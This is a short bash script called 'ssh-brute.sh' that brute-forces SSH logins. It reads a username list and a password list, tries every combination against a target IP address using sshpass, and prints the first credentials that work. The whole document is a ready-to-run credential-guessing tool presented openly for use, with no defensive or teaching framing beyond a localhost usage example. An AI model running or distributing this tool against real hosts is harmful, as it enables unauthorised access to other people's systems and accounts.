#
# ssh-brute.sh by Evan & Richard
# 
# This script cycles through all username and password combinations
# and trys to authenticate with a target device ssh service, until
# either a successful combination is found or all combinations have 
# been tried.
#
# Takes 3 arguments to run this script
# $1 = IP Address of target device
# $2 = Usernames file (one per line)
# $3 = Passwords file (one per line)
#
# e.g. ./ssh-brute 127.0.0.1 usernames.txt passwords.txt
#


RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

ip_addr=$1
usernames_file=$2
passwords_file=$3

function linec()
{
    local lc=$(wc -l $1 | cut -d ' ' -f1)
    echo $lc
}

if [ $# -ne 3 ]
then
    echo "SSH Brute Usage:"
    echo "Written by Evan"
    echo "arg1 = IP Address of target device"
    echo "arg2 = Usernames file (one per line)"
    echo "arg3 = Passwords file (one per line)"
    echo "e.g. ./ssh-brute 127.0.0.1 usernames.txt passwords.txt"
    exit 1
elif [ ! -f $usernames_file ] || [ ! -f $passwords_file ]
then 
    if [ ! -f $usernames_file ]
    then
        echo "Given Usernames file does not exist"
    fi
    if [ ! -f $passwords_file ]
    then
        echo "Given Passwords file does not exist"
    fi
    exit 2
else
    username_c=$(linec $usernames_file)
    password_c=$(linec $passwords_file)
    tot_combos=$(( username_c*password_c ))
    now=$(date)    
    start_t=$SECONDS
    echo "Starting SSH Brute Force at $now"
    echo "Target Device: $ip_addr"
    echo "Using Username file: $usernames_file"
    echo "  Contains $username_c usernames"
    echo "Using Password file: $passwords_file"
    echo "  Contains $password_c passwords"
    echo "Total Combinations: $tot_combos"
    combo_iter=1
    while IFS='' read -r username
    do
        while IFS='' read -r password
        do
            echo -en "\r\e[0K"
            echo -n "Combinations attempted: $combo_iter/$tot_combos"
            sshpass -p $password ssh $username@$ip_addr 'exit' > /dev/null 2>&1
            if [ $? -eq 0 ]
            then
                elapsed_t=$(( $SECONDS-$start_t ))
                echo -ne " ${GREEN}Successful${NC}\r\n"
                echo -e " Done: Completed in ${elapsed_t}s"
                echo -e "  Username: $username"
                echo -e "  Password: $password"
                exit 0
            fi
            (( combo_iter++ )) 
        done < $passwords_file
    done < $usernames_file
    elapsed_t=$(( $SECONDS-$start_t ))
    echo -e "\r\nAll Combinations attempted and failed"
    echo -e "Done: Completed in ${elapsed_t}s"
fi

